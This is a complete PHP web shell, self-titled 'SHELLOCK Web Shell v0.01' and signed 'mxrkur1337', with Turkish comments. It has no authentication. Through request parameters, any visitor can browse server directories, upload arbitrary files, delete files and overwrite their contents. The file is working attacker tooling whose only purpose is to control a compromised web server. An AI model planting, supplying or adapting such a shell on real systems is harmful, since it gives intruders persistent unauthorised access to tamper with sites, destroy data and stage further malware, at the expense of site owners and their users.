<?php
// Temel dizin ayarları
$rootDir = $_SERVER['DOCUMENT_ROOT']; // Web root dizini
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : $rootDir; // Eğer 'dir' parametresi varsa, o dizini kullan

// Dosya ve dizinleri listelemek için fonksiyon
function listFiles($dir) {
    $files = array_diff(scandir($dir), array('..', '.')); // '...' ve '.' dizinlerini hariç tutuyoruz
    return $files;
}

// Dosyanın bir dizin olup olmadığını kontrol etmek için fonksiyon
function isDirectory($path) {
    return is_dir($path);
}

// Yükleme işlemi kontrolü
if (isset($_FILES['uploadFile'])) {
    $uploadDir = $currentDir . '/' . basename($_FILES['uploadFile']['name']);
    if (move_uploaded_file($_FILES['uploadFile']['tmp_name'], $uploadDir)) {
        echo "<p>File upload successfully: " . basename($_FILES['uploadFile']['name']) . "</p>";
    } else {
        echo "<p>File upload failed</p>";
    }
}

// Dosya silme işlemi
if (isset($_GET['delete'])) {
    $deleteFile = $_GET['delete'];
    $filePath = $currentDir . '/' . $deleteFile;

    if (is_file($filePath)) {
        unlink($filePath); // Dosyayı sil
        echo "<p>File deleted successfully: " . $deleteFile . "</p>";
    }
}

// Dosya düzenleme işlemi
if (isset($_POST['editContent'])) {
    $editFile = $_POST['editFile'];
    $content = $_POST['content'];
    file_put_contents($currentDir . '/' . $editFile, $content);
    echo "<p>File edited successfully: " . $editFile . "</p>";
}

?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>...</title>
    <style>
        /* Temel stil */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #2a2a2a;
            color: #00FF00;
            margin: 0;
            padding: 0;
            line-height: 1.6;
        }

        h1 {
            text-align: center;
            color: #00FF00;
            margin-top: 20px;
            text-transform: uppercase;
            font-size: 2.5rem;
            letter-spacing: 2px;
        }

        .container {
            width: 90%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        /* Logo kısmı */
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo img {
            width: 120px;
            height: auto;
            filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.3));
        }

        /* Dosya listesi kısmı */
        .file-list {
            background: linear-gradient(145deg, #444, #333);
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.5);
            margin-bottom: 30px;
        }

        .file-list ul {
            list-style-type: none;
            padding: 0;
        }

        .file-list li {
            margin: 10px 0;
        }

        .file-list a {
            color: #00FF00;
            text-decoration: none;
            font-size: 1.2rem;
            transition: color 0.3s ease;
        }

        .file-list a:hover {
            color: #fff;
            text-decoration: underline;
        }

        .file-list .delete-btn {
            color: #FF0000;
            text-decoration: none;
            margin-left: 10px;
            font-size: 1rem;
            transition: color 0.3s ease;
        }

        .file-list .delete-btn:hover {
            color: #fff;
        }

        /* Dosya yükleme formu */
        .upload-form {
            background: linear-gradient(145deg, #333, #222);
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.5);
        }

        .upload-form h3 {
            margin-bottom: 15px;
            color: #00FF00;
            font-size: 1.5rem;
        }

        input[type="file"] {
            background-color: #555;
            border: 1px solid #444;
            color: #00FF00;
            padding: 15px;
            border-radius: 8px;
            width: 100%;
            margin: 10px 0;
            transition: all 0.3s ease;
        }

        input[type="file"]:hover {
            background-color: #666;
            cursor: pointer;
        }

        input[type="submit"] {
            background-color: #00FF00;
            border: 2px solid #00FF00;
            color: #2a2a2a;
            padding: 16px 32px;
            border-radius: 50px;
            font-size: 1.2rem;
            font-weight: bold;
            text-transform: uppercase;
            cursor: pointer;
            position: relative;
            overflow: hidden;
            transition: all 0.4s ease;
            box-shadow: 0 5px 20px rgba(0, 255, 0, 0.3);
        }

        input[type="submit"]:hover {
            background-color: #fff;
            color: #00FF00;
            border-color: #00FF00;
            box-shadow: 0 5px 25px rgba(0, 255, 0, 0.5);
            transform: translateY(-4px); /* Hover'da butonu biraz yukarı kaydır */
        }

        input[type="submit"]:active {
            transform: translateY(2px); /* Tıklama animasyonu */
            box-shadow: 0 2px 10px rgba(0, 255, 0, 0.2);
        }

        /* Responsive tasarım */
        @media screen and (max-width: 768px) {
            .container {
                width: 95%;
                padding: 10px;
            }

            h1 {
                font-size: 2rem;
            }

            .logo img {
                width: 100px;
            }

            .upload-form {
                padding: 15px;
            }

            .file-list a {
                font-size: 1.1rem;
            }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">
        <img src="https://pngimg.com/d/spy_PNG23.png" alt="Mxrkur Logo">
    </div>

    <h1>SHELLOCK Web Shell v0.01</h1>

    <div class="file-list">
        <h3>Available Files and Directories:</h3>
        <ul>
            <?php
            // Dizin içeriğini listele
            $files = listFiles($currentDir);
            foreach ($files as $file) {
                $filePath = $currentDir . '/' . $file;
                echo '<li>';
                if (isDirectory($filePath)) {
                    echo '<a href="?dir=' . urlencode($filePath) . '">[Dizin] ' . $file . '</a>';
                } else {
                    echo '<a href="' . $filePath . '" target="_blank">' . $file . '</a>';
                    // Dosya silme ve düzenleme bağlantılarını ekleyin
                    echo ' <a href="?delete=' . urlencode($file) . '" class="delete-btn" onclick="return confirm(\'Are u sure?\')">[Delete]</a>';
                    echo ' <a href="?edit=' . urlencode($file) . '" class="edit-btn">[Edit]</a>';
                }
                echo '</li>';
            }
            ?>
        </ul>
    </div>

    <?php
    // Dosya düzenleme formu
    if (isset($_GET['edit'])) {
        $editFile = $_GET['edit'];
        $filePath = $currentDir . '/' . $editFile;
        $content = file_get_contents($filePath); // Dosyanın mevcut içeriğini oku

        echo '
        <div class="upload-form">
            <h3>Edit File: ' . htmlspecialchars($editFile) . '</h3>
            <form action="" method="POST">
                <input type="hidden" name="editFile" value="' . htmlspecialchars($editFile) . '">
                <textarea name="content" rows="10" cols="150" required>' . htmlspecialchars($content) . '</textarea><br>
				<br></br>
                <center><input type="submit" name="editContent" value="Save"></center>
            </form>
        </div>';

    }
    ?>
	<br>
    <div class="upload-form">
        <h3>Upload File</h3>
        <form action="" method="POST" enctype="multipart/form-data">
            <input type="file" name="uploadFile" required>
            <center><input type="submit" value="Upload"></center>
        </form>
    </div>
    <h1>by mxrkur1337</h1>
</div>

</body>
</html>
